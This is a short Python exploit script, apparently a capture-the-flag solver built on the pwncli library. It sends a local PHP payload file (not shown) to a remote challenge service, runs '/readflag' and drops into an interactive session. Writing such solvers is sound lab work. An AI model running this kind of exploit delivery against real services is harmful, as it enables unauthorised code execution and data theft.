#!/usr/bin/env python3

from pwncli import *

cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

rl()
sl(open("./final.php", "r").read())
sl()
sl("-- EOF --")
sl()

sl("/readflag")

ia()
